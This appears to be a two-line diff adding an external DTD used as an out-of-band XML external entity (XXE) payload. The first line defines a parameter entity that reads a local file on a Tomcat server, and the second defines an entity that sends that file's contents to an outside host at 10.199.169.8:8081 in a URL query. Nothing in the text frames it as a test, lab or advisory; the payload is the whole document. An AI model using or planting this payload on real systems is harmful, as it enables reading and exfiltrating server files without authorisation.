@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/Tomcat/UI/test.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.199.169.8:8081/?%data;'>">
